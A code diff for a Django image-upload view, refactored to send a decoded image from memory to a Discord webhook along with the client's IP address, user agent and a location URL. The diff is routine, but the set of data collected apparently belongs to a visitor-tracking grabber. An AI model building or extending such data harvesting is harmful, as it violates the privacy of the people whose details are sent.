@@ -1,5 +1,4 @@
 import base64
-import os
 import json
 import requests
 from django.http import JsonResponse
@@ -23,14 +22,6 @@ def upload_image(request):
             location_url = data.get('locationUrl')
             image_data = data.get('image', '').split(',')[1] if 'image' in data and ',' in data.get('image', '') else None
 
-            # Temporary storage for image if available
-            image_path = None
-            if image_data:
-                image_bytes = base64.b64decode(image_data)
-                image_path = 'temp_image.png'
-                with open(image_path, 'wb') as image_file:
-                    image_file.write(image_bytes)
-
             # Collect IP and User-Agent information
             ip_address = get_client_ip(request)
             user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')
@@ -45,17 +36,18 @@ def upload_image(request):
                 f"Location URL: {location_url}"
             )
 
+            # If image data is provided, decode and send as a file
+            files = None
+            if image_data:
+                image_bytes = base64.b64decode(image_data)
+                files = {'file': ('image.png', image_bytes, 'image/png')}
+
             # Send to Discord webhook
-            files = {'file': open(image_path, 'rb')} if image_path else None
             response = requests.post(
                 DISCORD_WEBHOOK_URL,
                 files=files,
                 data={'content': content_message}
             )
-
-            # Clean up temporary image file
-            if image_path and os.path.exists(image_path):
-                os.remove(image_path)
 
             # Return success or failure response
             if response.status_code == 204:
